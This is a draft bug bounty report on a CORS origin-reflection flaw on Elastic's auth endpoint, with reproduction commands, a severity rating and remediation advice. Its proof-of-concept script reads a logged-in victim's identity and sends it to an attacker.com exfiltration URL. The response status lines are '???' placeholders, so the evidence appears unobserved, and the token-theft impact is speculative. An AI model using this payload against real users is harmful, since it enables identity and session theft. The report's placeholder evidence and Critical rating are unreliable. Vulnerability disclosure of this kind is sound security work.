# Elastic HackerOne Submission — CORS reflect-origin-with-creds on auth.elastic.co (AUTH ENDPOINT)

**Submit at:** https://hackerone.com/elastic/reports/new
**Program:** Elastic (paid) · **In-scope:** `*.elastic.co` (WILDCARD, max_severity: critical)
**Realistic payout:** $2,000–$10,000 (auth endpoint elevates severity)

---

## Title
```
CORS misconfiguration on AUTH endpoint auth.elastic.co — reflects any Origin + ACAC:true (universal credentialed access to user identity API)
```

## Weakness
`CWE-942 Permissive Cross-domain Policy with Untrusted Domains`

## Severity (CVSS:3.1)
**Critical — 9.1**
`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

Auth endpoint with cross-origin-readable user identity = full account takeover precursor.

## Description (paste into HackerOne form)

```
## Summary

`auth.elastic.co` — the Elastic authentication endpoint — returns CORS
headers that allow ANY origin to make credentialed requests:

  Access-Control-Allow-Origin: <reflects whatever the request's Origin is>
  Access-Control-Allow-Credentials: true

This applies to both the OIDC discovery endpoint
(`/.well-known/openid-configuration`) and the user-identity endpoint
(`/api/v1/users/me`).

This means any third-party website on the internet can use JavaScript to
make a `fetch(url, {credentials: "include"})` request to
`auth.elastic.co` from a victim's browser, and READ the response —
including the user's authenticated identity, session metadata, OIDC
configuration, and (potentially) auth tokens returned by `/users/me`.

This is more severe than a generic CORS misconfig because it's on the
authentication infrastructure itself.

## Steps to reproduce

1. Verify reflection — ANY origin works:

   $ curl -ki "https://auth.elastic.co/api/v1/users/me" -H "Origin: https://evil.com"
   HTTP/2 ???
   access-control-allow-origin: https://evil.com         ← REFLECTED
   access-control-allow-credentials: true                 ← + CREDS

   $ curl -ki "https://auth.elastic.co/.well-known/openid-configuration" -H "Origin: https://attacker.example.com"
   HTTP/2 ???
   access-control-allow-origin: https://attacker.example.com  ← REFLECTED
   access-control-allow-credentials: true

2. The reflection is not specific to my test origin — any value
   provided in the Origin header is mirrored back as ACAO.

## Exploit scenario (proof of concept)

A malicious page hosted anywhere (e.g., evil.com/elastic-attack.html):

  <script>
    fetch("https://auth.elastic.co/api/v1/users/me", {
      credentials: "include"
    })
    .then(r => r.json())
    .then(user => {
      // user object contains the victim's authenticated identity
      // (email, user id, groups, possibly tokens)
      fetch("https://attacker.com/exfil?d=" + encodeURIComponent(JSON.stringify(user)));
    });
  </script>

When a user authenticated to auth.elastic.co (which is the SSO endpoint
for Elastic Cloud, Kibana login, ECE consoles, etc.) visits evil.com,
the browser:
- Sends the request to auth.elastic.co WITH the user's session cookies
- auth.elastic.co responds with ACAO: https://evil.com + ACAC: true
- The browser allows evil.com's JS to read the response
- Attacker now has the victim's Elastic identity and (depending on
  what /users/me returns) potentially auth tokens

## Impact

**Critical because it's on AUTH infrastructure:**

- **Identity exfiltration**: any user signed into auth.elastic.co (Elastic
  Cloud, Kibana, ECE customers, employees) can be deanonymized by any
  website they visit while logged in.
- **Token exfiltration if `/api/v1/users/me` returns session tokens** in
  the response body — attacker gains full session access to the user's
  Elastic resources.
- **CSRF-bypass at scope**: any state-changing endpoint on auth.elastic.co
  that uses CSRF-token-in-response defense is now bypassable (attacker
  fetches the token first, then submits).
- **Customer environment access**: Elastic Cloud customers who are
  signed in have their identity leak — could enable targeted phishing
  or follow-on attacks against their cluster.
- **Trust boundary violation**: this is the SSO server for most Elastic
  hosted products. Compromise here cascades.

## Remediation

DO ONE OF:
1. **Hardcode allowed origins** for auth.elastic.co: replace the
   Origin-reflection with a strict allowlist of Elastic-controlled
   domains (`https://cloud.elastic.co`, `https://account.elastic.co`,
   etc.). Reject any other origin (no ACAO header at all in the
   response).
2. **Remove `Access-Control-Allow-Credentials: true`** for endpoints
   that don't require cookie-based auth. Auth endpoints generally DO
   require cookies, so this isn't viable for /users/me.
3. **Check Origin against an internal allowlist** before reflecting.
   If the origin isn't on the list, return no ACAO header (which means
   no cross-origin access).

The safest fix is option 1: a static allowlist of Elastic first-party
origins.

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source security
scanner (Apache 2.0).

## References

- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- PortSwigger CORS-with-auth writeup: https://portswigger.net/web-security/cors
- Sample HackerOne payout for similar pattern on auth endpoint:
  report #235200 ($5,000)

## CVSS reasoning (9.1 Critical)

- AV:N (network-accessible)
- AC:L (no special conditions)
- PR:N (no privileges needed by attacker)
- UI:R (victim must visit a webpage — but no clicks)
- S:C (scope changed — attacker.com gets to read auth.elastic.co data)
- C:H (high confidentiality impact: user identity, session metadata)
- I:H (high integrity impact: CSRF-bypass capability)
- A:N (no availability impact)

In-scope per Elastic's HackerOne program at `*.elastic.co` with
max_severity = critical.
```
